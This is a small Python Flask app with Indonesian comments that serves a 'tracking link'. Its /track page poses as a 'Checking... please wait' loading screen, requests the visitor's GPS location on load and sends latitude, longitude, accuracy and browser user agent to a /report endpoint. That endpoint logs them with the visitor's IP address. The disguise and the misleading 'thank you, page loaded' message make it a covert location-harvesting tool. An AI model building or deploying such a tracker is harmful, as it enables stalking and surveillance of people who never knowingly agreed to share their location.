from flask import Flask, request, jsonify, render_template_string
import requests
import os

app = Flask(__name__)

# Halaman utama tracking
@app.route('/')
def home():
    return render_template_string("""
        <h2>Tracking Link Active</h2>
        <p>Gunakan endpoint <b>/track</b> untuk melacak lokasi pengunjung.</p>
        <p>Contoh: <a href="/track">/track</a></p>
    """)

# Halaman yang meminta izin lokasi
@app.route('/track')
def track_page():
    return render_template_string("""
        <html>
        <head>
            <title>Checking...</title>
            <script>
                // Coba ambil lokasi GPS
                function sendLocation(position) {
                    fetch('/report', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            userAgent: navigator.userAgent
                        })
                    }).then(res => {
                        document.body.innerHTML = "<h3>Terima kasih! Halaman sudah dimuat.</h3>";
                    });
                }

                function handleError(error) {
                    document.body.innerHTML = "<p>Gagal mendapatkan lokasi (" + error.message + ")</p>";
                }

                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
            </script>
        </head>
        <body>
            <p>Mohon tunggu sebentar...</p>
        </body>
        </html>
    """)

# Endpoint untuk menerima data lokasi dari browser
@app.route('/report', methods=['POST'])
def report():
    data = request.get_json()
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)

    # Data dari browser
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    accuracy = data.get('accuracy')
    user_agent = data.get('userAgent')

    # Tampilkan log di Railway
    print("========= NEW GPS REPORT =========")
    print(f"IP Address : {ip_address}")
    print(f"Latitude   : {latitude}")
    print(f"Longitude  : {longitude}")
    print(f"Akurasi    : ±{accuracy} meter")
    print(f"User-Agent : {user_agent}")
    print("==================================")

    return jsonify({"status": "received"})

# Jalankan Flask app di hosting Railway
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

